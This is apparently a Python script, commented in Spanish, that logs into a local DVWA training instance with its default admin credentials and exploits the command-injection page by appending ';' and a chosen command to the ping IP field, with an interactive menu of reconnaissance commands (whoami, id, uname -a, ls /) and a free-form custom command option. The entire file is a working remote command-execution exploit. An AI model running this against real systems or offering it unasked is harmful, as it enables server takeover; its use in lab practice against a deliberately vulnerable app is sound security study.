import requests
from bs4 import BeautifulSoup

base_url = "http://localhost"  # Cambia si tu DVWA no corre en localhost
s = requests.Session()

# === LOGIN ===
def login():
    login_page = s.get(f"{base_url}/login.php")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})

    if not token_input:
        print("❌ No se encontró el token de sesión.")
        exit(1)

    user_token = token_input['value']
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token
    }

    response = s.post(f"{base_url}/login.php", data=login_data)
    if "Logout" in response.text:
        print("✅ Login exitoso.")
    else:
        print("❌ Falló el login.")
        exit(1)

# === ENVIAR PAYLOAD ===
def enviar_payload(comando):
    payload = f"127.0.0.1; {comando}"  # Inyección del comando
    exploit_data = {'ip': payload, 'Submit': 'Submit'}
    response = s.post(f"{base_url}/vulnerabilities/exec/", data=exploit_data)

    soup = BeautifulSoup(response.text, 'html.parser')
    pre_blocks = soup.find_all('pre')

    print("\n--- RESULTADO DEL COMANDO ---\n")
    if pre_blocks:
        for block in pre_blocks:
            print(block.get_text().strip())
    else:
        print("❌ No se encontró salida del comando.")

# === MENÚ INTERACTIVO ===
def menu():
    opciones = {
        "1": "whoami",
        "2": "id",
        "3": "uname -a",
        "4": "ls /",
        "5": "Personalizado"
    }

    while True:
        print("\n🛠️  MENU DE COMANDOS:")
        for k, v in opciones.items():
            print(f"[{k}] {v}")
        print("[0] Salir")

        opcion = input("Selecciona una opción: ")

        if opcion == "0":
            print("👋 Saliendo...")
            break
        elif opcion in opciones:
            if opcion == "5":
                comando = input("Introduce tu propio comando: ")
            else:
                comando = opciones[opcion]

            enviar_payload(comando)
        else:
            print("❌ Opción no válida.")

# === MAIN ===
if __name__ == "__main__":
    login()
    menu()
